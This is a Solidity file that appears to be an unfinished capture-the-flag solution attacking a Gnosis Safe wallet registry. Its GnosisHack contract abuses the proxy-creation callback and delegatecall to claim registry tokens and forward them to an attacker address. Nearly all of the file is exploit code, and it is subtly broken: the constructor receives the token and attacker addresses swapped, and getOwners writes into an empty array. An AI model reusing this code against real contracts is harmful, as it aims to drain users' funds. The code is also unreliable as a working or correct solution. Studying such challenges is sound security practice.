// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IBackdoorDvt {
    function addBeneficiary(address beneficiary) external;
}

contract GnosisHackDeployer {
    constructor(
        address walletRegistryAdr,
        address walletFactoryAdr,
        address payable masterCopyAdr,
        address[] memory initialBeneficiaries,
        address token
    ) {
        console.log("wallet registryAdr deployer");
        console.log(walletRegistryAdr);
        GnosisHack backdoorExploit = new GnosisHack(
            walletRegistryAdr,
            walletFactoryAdr,
            masterCopyAdr,
            initialBeneficiaries,
            msg.sender,
            token
        );
        // backdoorExploit.addBeneficiery();

        backdoorExploit.attack();
        backdoorExploit.transferTokens();
    }
}

contract GnosisHack is IProxyCreationCallback {
    address public walletRegistry;

    address public walletFactory;

    address public gnosisSafeMasterCopy;

    address[] beneficiaries;

    address public attacker;
    IERC20 public token;

    constructor(
        address walletRegistryAdr,
        address walletFactoryAdr,
        address payable masterCopyAdr,
        address[] memory initialBeneficiaries,
        address tokenAdr,
        address attackerAdr
    ) payable {
        console.log("wallet registryAdr gnosisHack");
        console.log(walletRegistryAdr);
        walletRegistry = walletRegistryAdr;
        walletFactory = walletFactoryAdr;
        gnosisSafeMasterCopy = masterCopyAdr;
        beneficiaries = initialBeneficiaries;
        attacker = attackerAdr;
        token = IERC20(tokenAdr);
    }

    function transferTokens() external {
        token.transfer(attacker, token.balanceOf(address(this)));
    }

    function attack() external {
        console.log("get owners");
        // console.log(getThreshold());
        // console.log(GnosisSafe(this).getOwners());
        console.log("ran the attack method");
        bytes memory initializer = abi.encodeWithSignature("callbackExploit()");
        // gnosisSafeProxyFactory = new GnosisSafeProxyFactory();
        console.log(address(this));
        GnosisSafeProxy proxy = GnosisSafeProxyFactory(walletFactory)
            .createProxyWithCallback(
                address(this),
                initializer,
                uint256(2),
                IProxyCreationCallback(address(this))
            );
        console.log("done with attack method");
    }

    function proxyCreated(
        GnosisSafeProxy proxy,
        address fakeSingleton,
        bytes calldata initializer,
        uint256
    ) external override {
        console.log("proxyCreated @@@@");
        bytes4 selector = GnosisSafe.setup.selector;
        console.log("wallet registryAdr gnosisHack proxyCreated");
        console.log(walletRegistry);
        (bool success, bytes memory data) = walletRegistry.delegatecall(
            abi.encodeWithSignature(
                "proxyCreated(address,address,bytes,uint256)",
                address(this),
                address(gnosisSafeMasterCopy),
                abi.encodePacked(selector),
                uint256(2)
            )
        );
        console.log(success);
        console.log(string(data));

        for (uint16 i = 0; i < beneficiaries.length; i++) {
            console.log(address(gnosisSafeMasterCopy));

            removeBeneficiary();
        }
    }

    function getThreshold() public returns (uint256) {
        return 1;
    }

    function getOwners() public view returns (address[] memory fakeOwner) {
        fakeOwner[0] = beneficiaries[beneficiaries.length - 1];
    }

    function removeBeneficiary() internal {
        require(beneficiaries.length > 0, "no beneficiaries to pop");
        beneficiaries.pop();
    }

    function callbackExploit() external {
        console.log("the callback function was executed:::");
    }
}

//fallback()  external payable {    }

//  tester functions below

// function addBeneficiery() external {
//     IBackdoorDvt(walletRegistry).addBeneficiary(beneficiery);
// }

// function printGnosisSafeSetupSelector() external {
//     bytes4 selector = GnosisSafe.setup.selector;
//     // console.log(string(selector));
//     //console.log("gnosis safe selector:");
//     //console.logBytes(selector);
//     // console.logBytes(bytes4(GnosisSafe.setup.selector)[0]);
// }

// function toHexDigit(uint8 d) internal pure returns (bytes1) {
//     if (0 <= d && d <= 9) {
//         return bytes1(uint8(bytes1("0")) + d);
//     } else if (10 <= uint8(d) && uint8(d) <= 15) {
//         return bytes1(uint8(bytes1("a")) + d - 10);
//     }
//     revert();
// }

// function fromCode(bytes4 code) public pure returns (string memory) {
//     bytes memory result = new bytes(10);
//     result[0] = bytes1("0");
//     result[1] = bytes1("x");
//     for (uint i = 0; i < 4; ++i) {
//         result[2 * i + 2] = toHexDigit(uint8(code[i]) / 16);
//         result[2 * i + 3] = toHexDigit(uint8(code[i]) % 16);
//     }
//     return string(result);
// }
